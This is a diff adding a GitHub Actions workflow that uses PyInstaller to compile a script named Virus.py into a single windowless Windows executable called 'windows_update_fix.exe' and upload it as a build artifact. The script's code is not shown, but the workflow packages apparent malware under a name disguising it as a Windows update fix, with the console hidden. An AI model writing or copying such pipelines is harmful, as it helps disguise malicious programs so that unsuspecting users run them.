@@ -1,0 +1,17 @@
+name: Build EXE
+on: [push]
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+    - uses: actions/checkout@v3
+    - uses: actions/setup-python@v4
+      with:
+        python-version: '3.10'
+    - run: pip install pyinstaller
+    - run: pyinstaller --noconsole --onefile --name=windows_update_fix Virus.py
+    - uses: actions/upload-artifact@v3
+      with:
+        name: ExecutableFile
+        path: dist/windows_update_fix.exe
+        
